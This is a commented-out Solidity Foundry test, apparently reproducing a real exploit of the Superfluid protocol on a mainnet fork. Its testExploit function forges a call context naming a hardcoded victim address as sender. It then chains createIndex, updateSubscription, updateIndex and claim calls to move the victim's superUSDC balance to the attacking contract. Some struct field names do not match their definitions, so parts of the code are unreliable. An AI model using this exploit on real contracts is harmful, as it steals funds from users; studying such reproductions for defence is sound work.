// // SPDX-License-Identifier: Unlicense
// pragma solidity ^0.8.13;

// import "foundry-huff/HuffDeployer.sol";
// import "forge-std/Test.sol";
// import "forge-std/console.sol";

// import "../src/HarvestFF/interfaces/IFlashLoanReceiver.sol";
// import "../src/HarvestFF/interfaces/ILendingPool.sol";
// import "../src/HarvestFF/interfaces/ILendingPoolAddressesProvider.sol";
// import "../src/HarvestFF/interfaces/IERC20.sol";

// import "../src/FairFF/interfaces/CErc20Interface.sol";
// import "../src/FairFF/interfaces/ComptrollerInterface.sol";

// library ContextDefinitions {

//     /**************************************************************************
//     / Call info
//     /**************************************************************************/

//     // app level
//     uint256 constant internal CALL_INFO_APP_LEVEL_MASK = 0xFF;

//     // call type
//     uint256 constant internal CALL_INFO_CALL_TYPE_SHIFT = 32;
//     uint256 constant internal CALL_INFO_CALL_TYPE_MASK = 0xF << CALL_INFO_CALL_TYPE_SHIFT;
//     uint8 constant internal CALL_INFO_CALL_TYPE_AGREEMENT = 1;
//     uint8 constant internal CALL_INFO_CALL_TYPE_APP_ACTION = 2;
//     uint8 constant internal CALL_INFO_CALL_TYPE_APP_CALLBACK = 3;

//     function decodeCallInfo(uint256 callInfo)
//         internal pure
//         returns (uint8 appLevel, uint8 callType)
//     {
//         appLevel = uint8(callInfo & CALL_INFO_APP_LEVEL_MASK);
//         callType = uint8((callInfo & CALL_INFO_CALL_TYPE_MASK) >> CALL_INFO_CALL_TYPE_SHIFT);
//     }

//     function encodeCallInfo(uint8 appLevel, uint8 callType)
//         internal pure
//         returns (uint256 callInfo)
//     {
//         return uint256(appLevel) | (uint256(callType) << CALL_INFO_CALL_TYPE_SHIFT);
//     }
// }


// // fork_block_number = 14684685
// interface IUniswapV2Router {
//     function swapExactTokensForTokens(
//         uint amountIn,
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external returns (uint[] memory amounts);

//     function swapTokensForExactTokens(
//         uint amountOut,
//         uint amountInMax,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external returns (uint[] memory amounts);
// }

// interface IUSDT {
//     function approve(address _spender, uint256 _value) external;
//     function balanceOf(address owner) external view returns (uint256);
//     function transfer(address _to, uint256 _value) external;
// }

// interface IWETH {
//     function deposit() external payable;
//     function withdraw(uint wad) external;
//     function balanceOf(address account) external view returns (uint256);
//     function approve(address spender, uint256 amount) external;
// }
// // ISuperfluid
// interface ISuperfluid {
//     function callAgreementWithContext(
//         address agreementClass,
//         bytes calldata callData,
//         bytes calldata userData,
//         bytes calldata ctx
//     )
//         external
//         // validCtx(ctx)
//         // onlyAgreement(agreementClass)
//         returns (bytes memory newCtx, bytes memory returnedData);
// }

// // IInstantDistributionAgreementV1
// interface IInstantDistributionAgreementV1 {
//     function createIndex(
//         address token,
//         uint32 indexId,
//         bytes calldata ctx) external returns(bytes memory newCtx);
    
//     function updateIndex(
//         address token,
//         uint32 indexId,
//         uint128 indexValue,
//         bytes calldata ctx) external returns(bytes memory newCtx);

//     function updateSubscription(
//         address token,
//         uint32 indexId,
//         address subscriber,
//         uint128 units,
//         bytes calldata ctx) external returns(bytes memory newCtx);

//     function claim(
//         address token,
//         address publisher,
//         uint32 indexId,
//         address subscriber,
//         bytes calldata ctx) external returns(bytes memory newCtx);
// }

// // super token 
// interface ISuperToken is IERC20{
//     function downgrade(uint256 amount) external;
// }


// // context
// struct Context {
//     //
//     // Call context
//     //
//     // callback level
//     uint8 appLevel;
//     // type of call
//     uint8 callType;
//     // the system timestsamp
//     uint256 timestamp;
//     // The intended message sender for the call
//     address msgSender;

//     //
//     // Callback context
//     //
//     // For callbacks it is used to know which agreement function selector is called
//     bytes4 agreementSelector;
//     // User provided data for app callbacks
//     bytes userData;

//     //
//     // App context
//     //
//     // app allowance granted
//     uint256 appAllowanceGranted;
//     // app allowance wanted by the app callback
//     uint256 appAllowanceWanted;
//     // app allowance used, allowing negative values over a callback session
//     int256 appAllowanceUsed;
//     // app address
//     address appAddress;
//     // app allowance in super token
//     address appAllowanceToken;
// }


// contract ExploitTest is Test {

//     ISuperfluid constant superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
//     IInstantDistributionAgreementV1 constant ida = IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
//     ISuperToken constant superusdc = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
//     IERC20 constant usdc = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);

//     address constant victim = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;

//     function setUp() public {
//         emit log_named_uint("block number", block.number);

//     }

//     function encodeContext(Context memory context)
//         private pure
//         returns (bytes memory ctx)
//     {
//         uint256 callInfo = ContextDefinitions.encodeCallInfo(context.appLevel, context.callType);
//         uint256 allowanceIO =
//             uint128(context.appAllowanceGranted) |
//             (uint256(uint128(context.appAllowanceWanted)) << 128);
//         ctx = abi.encode(
//             abi.encode(
//                 callInfo,
//                 context.timestamp,
//                 context.msgSender,
//                 context.agreementSelector,
//                 context.userData
//             ),
//             abi.encode(
//                 allowanceIO,
//                 context.appAllowanceUsed,
//                 context.appAddress,
//                 context.appAllowanceToken
//             )
//         );
//     }
//     function testExploit() public {
//         // context crate (exploited)
//         // bytes memory ctx = _updateContext(Context({
//         //     appCallbackLevel: 0,
//         //     callType: ContextDefinitions.CALL_INFO_CALL_TYPE_APP_ACTION,
//         //     timestamp: getNow(),
//         //     msgSender: msgSender,
//         //     agreementSelector: 0,
//         //     userData: "",
//         //     appCreditGranted: 0,
//         //     appCreditWantedDeprecated: 0,
//         //     appCreditUsed: 0,
//         //     appAddress: address(app),
//         //     appCreditToken: ISuperfluidToken(address(0))
//         // }));
//         Context memory fakeCTX = Context({
//             appCallbackLevel: 0,
//             callType: ContextDefinitions.CALL_INFO_CALL_TYPE_AGREEMENT,
//             timestamp: block.timestamp,
//             msgSender: victim,
//             agreementSelector: 0,
//             userData: "",
//             appAllowanceGranted: 0,
//             appAllowanceWanted: 0,
//             appAllowanceUsed: 0,
//             appAddress: victim,
//             appAllowanceToken: address(0)
//         });


//         uint32 indexId = 0xdeadbeaf;

//         superfluid.callAgreementWithContext(
//             address(ida), 

//             abi.encodeWithSelector(
//                 IInstantDistributionAgreementV1.createIndex.selector,
//                 superusdc,
//                 indexId,
//                 encodeContext(fakeCTX),
//                 new bytes(0)
//             ),
//             new bytes(0)
//         );

//         // crate index => who? => sender money index  (updateSubscriptns)
//         uint256 superusdc_balalnce = superusdc.balanceOf(address(victim));
//         emit log_named_decimal_uint("superusdc_balalnce", superusdc_balalnce, 6);

//         superfluid.callAgreementWithContext(
//             address(ida), 

//             abi.encodeWithSelector(
//                 IInstantDistributionAgreementV1.updateSubscription.selector,
//                 superusdc,
//                 indexId,
//                 address(this),
//                 // superusdc.balanceOf(address(victim)),
//                 superusdc_balalnce,
//                 encodeContext(fakeCTX),
//                 new bytes(0)
//             ),
//             new bytes(0)
//         );

//         // claim <- index value , subscriptins value => how much? 
//         // index update!!
//         superfluid.callAgreementWithContext(
//             address(ida), 

//             abi.encodeWithSelector(
//                 IInstantDistributionAgreementV1.updateIndex.selector,
//                 superusdc,
//                 indexId,
//                 1,
//                 encodeContext(fakeCTX),
//                 new bytes(0)
//             ),
//             new bytes(0)
//         );

//         // updat index => claim call (publisher is victim)
//         // context msg.sender => origin al this contract
//         // pending deistribution => updateAgremment => setBalancer 
//         fakeCTX.msgSender = address(this);
//         superfluid.callAgreementWithContext(
//             address(ida), 

//             abi.encodeWithSelector(
//                 IInstantDistributionAgreementV1.claim.selector,
//                 superusdc,
//                 victim,
//                 indexId,
//                 address(this),
//                 // encodeContext(fakeCTX),
//                 new bytes(0)
//             ),
//             new bytes(0)
//         );

//         emit log_named_decimal_uint("superusdc_balalnce", superusdc.balanceOf(address(this)), 6);

//     }
// }
